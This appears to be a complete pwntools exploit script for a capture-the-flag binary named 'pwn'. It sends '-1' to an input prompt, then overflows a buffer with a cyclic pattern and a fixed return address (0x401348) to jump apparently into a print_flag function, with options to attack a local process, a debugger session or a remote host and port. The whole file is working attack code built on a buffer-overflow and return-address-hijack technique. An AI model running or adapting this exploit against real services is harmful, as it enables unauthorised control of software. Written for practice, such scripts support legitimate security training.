#!/usr/bin/env python

from pwn import *
from sys import argv

elf = context.binary = ELF("./pwn")
context.arch = "amd64"
context.terminal = ["kitty"]

gdbscript = """
break *main
break *print_flag
continue
"""

if len(argv) > 1 and argv[1] == "gdb":
    context.log_level = "debug"
    io = elf.debug(gdbscript=gdbscript)
elif len(argv) == 3:
    io = remote( argv[1], int(argv[2]) )
else:
    io = elf.process()

# PREP
rop = cyclic(cyclic_find("faab")) + p64(0x401348)

io.sendlineafter(b": ", b"-1")
io.recvuntil(b":\n")
io.sendline(rop)

# PWN!
io.interactive()
